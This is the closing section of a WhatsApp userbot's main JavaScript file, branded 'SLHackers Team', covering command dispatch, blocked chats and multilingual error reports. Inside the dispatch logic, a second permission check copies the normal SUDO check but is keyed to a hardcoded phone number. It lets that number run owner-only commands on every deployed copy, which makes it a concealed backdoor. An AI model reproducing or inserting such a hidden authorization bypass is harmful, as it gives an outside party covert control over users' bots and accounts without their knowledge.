                await conn.sendMessage(msg.key.remoteJid, Buffer.from(wlogo.data), MessageType.image, { mimetype: Mimetype.png, caption: gb.message });
            }
            return;
        }
        // ==================== End Greetings ====================

        // ==================== Blocked Chats ====================
        if (config.BLOCKCHAT !== false) {
            var abc = config.BLOCKCHAT.split(',');
            if (msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return;
        }
        if (config.SUPPORT == '905524317852-1612300121') {
            var sup = config.SUPPORT.split(',');
            if (msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return;
        }
        if (config.SUPPORT2 == '905511384572-1617736751') {
            var tsup = config.SUPPORT2.split(',');
            if (msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return;
        }
        if (config.SUPPORT3 == '905511384572-1621015274') {
            var nsup = config.SUPPORT3.split(',');
            if (msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return;
        }
        // ==================== End Blocked Chats ====================

        // ==================== Events ====================
        events.commands.map(
            async (command) => {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null &&
                    (command.pattern === undefined || (command.pattern !== undefined &&
                        command.pattern.test(text_msg)))) ||
                    (command.pattern !== undefined && command.pattern.test(text_msg)) ||
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                        && msg.message && msg.message.videoMessage !== null &&
                        (command.pattern === undefined || (command.pattern !== undefined &&
                            command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = conn.chats.get(msg.key.remoteJid)

                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((OWN.ff == "94755681782,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    // ==================== End Events ====================

                    // ==================== Message Catcher ====================
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await conn.chatRead(msg.key.remoteJid);
                        }
                        var match = text_msg.match(command.pattern);
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                            && msg.message.imageMessage !== null) {
                            whats = new Image(conn, msg);
                        } else if (command.on !== undefined && (command.on === 'video')
                            && msg.message.videoMessage !== null) {
                            whats = new Video(conn, msg);
                        } else {
                            whats = new Message(conn, msg);
                        }
                        if (msg.key.fromMe && command.deleteCommand) {
                            var wrs = conn.user.phone.wa_version.split('.')[2]
                            if (wrs < 11) {
                                await whats.delete()
                            }
                        }
                        // ==================== End Message Catcher ====================

                        // ==================== Error Message ====================
                        try {
                            await command.function(whats, match);
                        }
                        catch (error) {
                            if (config.NOLOG == 'true') return;

                            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                                await conn.sendMessage(conn.user.jid, '*-- HATA RAPORU [🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴] --*' +
                                    '\n*SLHackers Team Bot bir hata gerçekleşti!*' +
                                    '\n_Bu hata logunda numaranız veya karşı bir tarafın numarası olabilir. Lütfen buna dikkat edin!_' +
                                    '\n_Yardım için Telegram grubumuza yazabilirsiniz._' +
                                    '\n_Bu mesaj sizin numaranıza (kaydedilen mesajlar) gitmiş olmalıdır._' +
                                    '\n_Hatayı https://chat.whatsapp.com/LpAdVOtMNYj3weg7VQVbci bu gruba iletebilirsiniz._\n\n' +
                                    '*Gerçekleşen Hata:* ```' + error + '```\n\n'
                                    , MessageType.text, { detectLinks: false });

                                if (error.message.includes('URL')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴] ⚕️*' +
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Only Absolutely URLs Supported_' +
                                        '\n*Nedeni:* _Medya araçlarının (xmedia, sticker..) LOG numarasında kullanılması._' +
                                        '\n*Çözümü:* _LOG numarası hariç herhangi bir sohbette komut kullanılabilir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴] ⚕️*' +
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _SQL Database Error_' +
                                        '\n*Nedeni:* _Database\'in bozulması._ ' +
                                        '\n*Solution:* _Bilinen herhangi bir çözümü yoktur. Yeniden kurmayı deneyebilirsiniz._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴] ⚕️*' +
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Split of Undefined_' +
                                        '\n*Nedeni:* _Grup adminlerinin kullanabildiği komutların ara sıra split fonksiyonunu görememesi._ ' +
                                        '\n*Çözümü:* _Restart atmanız yeterli olacaktır._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴] ⚕️*' +
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Ookla Server Connection_' +
                                        '\n*Nedeni:* _Speedtest verilerinin sunucuya iletilememesi._' +
                                        '\n*Çözümü:* _Bir kez daha kullanırsanız sorun çözülecektir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴] ⚕️*' +
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Requested Audio Params_' +
                                        '\n*Nedeni:* _TTS komutunun latin alfabesi dışında kullanılması._' +
                                        '\n*Çözümü:* _Komutu latin harfleri çerçevesinde kullanırsanız sorun çözülecektir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴] ⚕️*' +
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _No Such File or Directory_' +
                                        '\n*Nedeni:* _Pluginin yanlış kodlanması._' +
                                        '\n*Çözümü:* _Lütfen plugininin kodlarını kontrol edin._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴] ⚕️*' +
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Error 404 HTTPS_' +
                                        '\n*Nedeni:* _Heroku plugini altındaki komutların kullanılması sonucu sunucu ile iletişime geçilememesi._' +
                                        '\n*Çözümü:* _Biraz bekleyip tekrar deneyin. Hala hata alıyorsanız internet sitesi üzerinden işlemi gerçekleştirin._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴] ⚕️*' +
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Reply Delete Function_' +
                                        '\n*Nedeni:* _IMG yada Wiki komutlarının kullanılması._' +
                                        '\n*Çözümü:* _Bu hatanın çözümü yoktur. Önemli bir hata değildir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴] ⚕️*' +
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Reply Delete Function_' +
                                        '\n*Nedeni:* _IMG yada Wiki komutlarının kullanılması._' +
                                        '\n*Çözümü:* _Bu hatanın çözümü yoktur. Önemli bir hata değildir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴] ⚕️*' +
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Bailyes Action Error_ ' +
                                        '\n*Nedeni:* _Tam nedeni bilinmiyor. Birden fazla seçenek bu hatayı tetiklemiş olabilir._' +
                                        '\n*Çözümü:* _Bir kez daha kullanırsanız düzelebilir. Hata devam ediyorsa restart atmayı deneyebilirsiniz._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴] ⚕️*' +
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Cannot Decode Text or Media_' +
                                        '\n*Nedeni:* _Pluginin yanlış kullanımı._' +
                                        '\n*Çözümü:* _Lütfen komutları plugin açıklamasında yazdığı gibi kullanın._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴] ⚕️*' +
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Word Character Usage_' +
                                        '\n*Nedeni:* _TTP, ATTP gibi komutların latin alfabesi dışında kullanılması._' +
                                        '\n*Çözümü:* _Komutu latif alfabesi çerçevesinde kullanırsanız sorun çözülecektir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴] ⚕️*' +
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Deleting Plugin_' +
                                        '\n*Nedeni:* _Silinmek istenen plugin isminin yanlış girilmesi._' +
                                        '\n*Çözümü:* _Lütfen silmek istediğiniz pluginin başına_ *__* _koymadan deneyin. Hala hata alıyorsanız ismin sonundaki_ ```?(.*) / $``` _gibi ifadeleri eksiksiz girin._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await conn.sendMessage(conn.user.jid, '*🙇🏻 Maalesef Bu Hatayı Okuyamadım! 🙇🏻*' +
                                        '\n_Daha fazla yardım için grubumuza yazabilirsiniz._'
                                        , MessageType.text
                                    );
                                }
                            }
                            else {
                                await conn.sendMessage(conn.user.jid, '*-- Bot වාර්තාව [🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴] --*' +
                                    '\n*🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴 නිසි ලෙස ක්‍රියා කරයි!*' +
                                    '\n\n\n_මෙය LOG අංකයයි.. මෙහි පණිවිඩ පිළිබඳව සැලකිලිමත් වන්න..!_' +
                                    '\n_ඔබට යම් ගැටලුවක් ඇත්නම් අපගේ සහය සමූහයට සම්බන්ධ වන්න.._' +
                                    '\n_සහය සමූහය_: https://chat.whatsapp.com/LpAdVOtMNYj3weg7VQVbci' +
                                    '\n_(සුරැකි පණිවිඩ)._\n\n' +
                                    '*Error:* ```' + error + '```\n\n'
                                    , MessageType.text, { detectLinks: false }
                                );
                                if (error.message.includes('URL')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️දෝශ විශ්ලේෂණය!*' +
                                        '\n[🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴]' +
                                        '\n\n\n*ප්‍රධාන දෝෂය:* _සහය වන්නේ නියත වශයෙන්ම URL පමණි_' +
                                        '\n*හේතුව:* _LOG අංකය තුළ මාධ්‍ය මෙවලම් (nmedia, ස්ටිකර් ..) භාවිතය._' +
                                        '\n*විසඳුම:* _ඔබට LOG අංකය හැර ඕනෑම චැට් එකකදී විධානයන් භාවිතා කළ හැකිය._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️දෝශ විශ්ලේෂණය!*' +
                                        '\n[🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴]' +
                                        '\n\n\n*ප්‍රධාන දෝෂය:* _ප්ලගිනය ඉවත් කිරීම_' +
                                        '\n*හේතුව:* _ප්ලගිනයේ නම වැරදි ලෙස ඇතුළත් කිරීම මැකීමට අවශ්‍යයි._' +
                                        '\n*Solution:* _Please try without adding_ *__* _to the plugin you want to delete. If you still get an error, try to add like_ ```?(.*) / $``` _to the end of the name._ '
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️දෝශ විශ්ලේෂණය!*' +
                                        '\n[🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴]' +
                                        '\n\n\n*ප්‍රධාන දෝෂය:* _නිර්වචනය නොකළ බෙදීම_' +
                                        '\n*හේතුව:* _කණ්ඩායම් පරිපාලකයින්ට භාවිතා කළ හැකි නියෝග සමහර විට බෙදීමේ ක්‍රියාවලිය නොදකිති._ ' +
                                        '\n*විසඳුම:* _නැවත ආරම්භ කිරීම ප්‍රමාණවත් වේ._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️දෝශ විශ්ලේෂණය!*' +
                                        '\n[🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴]' +
                                        '\n\n\n*ප්‍රධාන දෝෂය:* _SQL දත්ත සමුදා දෝෂය_' +
                                        '\n*හේතුව:* _දත්ත සමුදාය දූෂණය_ ' +
                                        '\n*විසඳුම:* _දන්නා විසඳුමක් නොමැත. ඔබට එය නැවත ස්ථාපනය කිරීමට උත්සාහ කළ හැකිය._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️දෝශ විශ්ලේෂණය!*' +
                                        '\n[🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴]' +
                                        '\n\n\n*ප්‍රධාන දෝෂය:* _Ookla සේවාදායක සම්බන්ධතාවය_' +
                                        '\n*හේතුව:* _Sepedtest දත්ත සේවාදායකයට සම්ප්‍රේෂණය කළ නොහැක._' +
                                        '\n*විසඳුම:* _ඔබ එය තවත් වරක් භාවිතා කළහොත් ගැටලුව විසඳනු ඇත._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️දෝශ විශ්ලේෂණය!*' +
                                        '\n[🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴]' +
                                        '\n\n\n*ප්‍රධාන දෝෂය:* _ඉල්ලූ ශ්‍රව්‍ය පරාමිතීන්_' +
                                        '\n*හේතුව:* _ලතින් හෝඩියේ පිටත TTS විධානය භාවිතා කිරීම._' +
                                        '\n*විසඳුම:* _ඔබ ලතින් අකුරු රාමුව තුළ විධානය භාවිතා කළහොත් ගැටළුව විසඳනු ඇත._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️දෝශ විශ්ලේෂණය!*' +
                                        '\n[🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴]' +
                                        '\n\n\n*ප්‍රධාන දෝෂය:* _එවැනි ගොනුවක් හෝ නාමාවලියක් නොමැත' +
                                        '\n*හේතුව:* _ප්ලගිනයේ වැරදි කේතීකරණය._' +
                                        '\n*විසඳුම:* _කරුණාකර ඔබගේ ප්ලගින කේත පරීක්‍ෂා කරන්න._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️දෝශ විශ්ලේෂණය!*' +
                                        '\n[🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴]' +
                                        '\n\n\n*ප්‍රධාන දෝෂය:* _දෝෂය 404 HTTPS_' +
                                        '\n*හේතුව:* _හෙරෝකු ප්ලගිනය යටතේ ඇති විධානයන් භාවිතා කිරීම හේතුවෙන් සේවාදායකයා සමඟ සන්නිවේදනය කිරීමට නොහැකි වීම._' +
                                        '\n*විසඳුම:* _ටික වේලාවක් රැඳී සිට නැවත උත්සාහ කරන්න. ඔබට තවමත් දෝෂයක් ඇත්නම් එම ගනුදෙනුව වෙබ් අඩවියේ සිදු කරන්න._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️දෝශ විශ්ලේෂණය!*' +
                                        '\n[🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴]' +
                                        '\n\n\n*ප්‍රධාන දෝෂය:* _Reply Delete Function_' +
                                        '\n*හේතුව:* _IMG හෝ විකි විධානයන් භාවිතා කිරීම._' +
                                        '\n*විසඳුම:* _මෙම දෝෂයට විසඳුමක් නොමැත. එය මාරාන්තික වරදක් නොවේ._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️දෝශ විශ්ලේෂණය!*' +
                                        '\n[🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴]' +
                                        '\n\n\n*ප්‍රධාන දෝෂය:* _Reply Delete Function_' +
                                        '\n*හේතුව:* _IMG හෝ විකි විධානයන් භාවිතා කිරීම._' +
                                        '\n*විසඳුම:* _මෙම දෝෂයට විසඳුමක් නොමැත. එය මාරාන්තික වරදක් නොවේ._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️දෝශ විශ්ලේෂණය!*' +
                                        '\n[🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴]' +
                                        '\n\n\n*ප්‍රධාන දෝෂය:* _Bailyes ක්‍රියා දෝෂය_' +
                                        '\n*හේතුව:* _නිශ්චිත හේතුව නොදනී. විකල්ප එකකට වඩා මෙම දෝෂය ඇති කිරීමට ඉඩ ඇත._' +
                                        '\n*විසඳුම:* _ඔබ එය නැවත භාවිතා කළහොත් එය වැඩිදියුණු විය හැකිය. දෝෂය දිගටම පවතී නම්, ඔබට නැවත ආරම්භ කිරීමට උත්සාහ කළ හැකිය._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️දෝශ විශ්ලේෂණය!*' +
                                        '\n[🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴]' +
                                        '\n\n\n*ප්‍රධාන දෝෂය:* _පෙළ හෝ මාධ්‍ය_ විකේතනය කළ නොහැක' +
                                        '\n*හේතුව:* _ප්ලග් එක වැරදි ලෙස භාවිතා කිරීම._' +
                                        '\n*විසඳුම:* _කරුණාකර ප්ලගිනය විස්තරයේ ලියා ඇති පරිදි විධානයන් භාවිතා කරන්න._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️දෝශ විශ්ලේෂණය!*' +
                                        '\n[🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴]' +
                                        '\n\n\n*ප්‍රධාන දෝෂය:* _වචන චරිත භාවිතය_' +
                                        '\n*හේතුව:* _ලතින් හෝඩියේ පිටත TTP, ATTP වැනි විධානයන් භාවිතා කිරීම._' +
                                        '\n*විසඳුම:* _ඔබ ලතින් හෝඩියේ විධානය භාවිතා කළහොත් ගැටළුව විසඳනු ඇත.._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await conn.sendMessage(conn.user.jid, '*🙇🏻 කණගාටුයි..! SLHackers Team Bots Auto error පද්ධතියට හදුනාගත නොහැකියි..🙇🏻*' +
                                        '\n_ඔබට පුලුවන් වැඩිදුර උදව් සදහා සහය සමූහයන්ට ලියන්න.._'
                                        , MessageType.text
                                    );
                                }
                            }
                        }
                    }
                }
            }
        )
    });
    // ==================== End Error Message ====================

    try {
        await conn.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Refreshing your old version string...'))
            conn.loadAuthInfo(Session.deCrypt(config.SESSION));
            try {
                await conn.connect();
            } catch {
                return;
            }
        }
    }
}

HiruwaSlHackers();
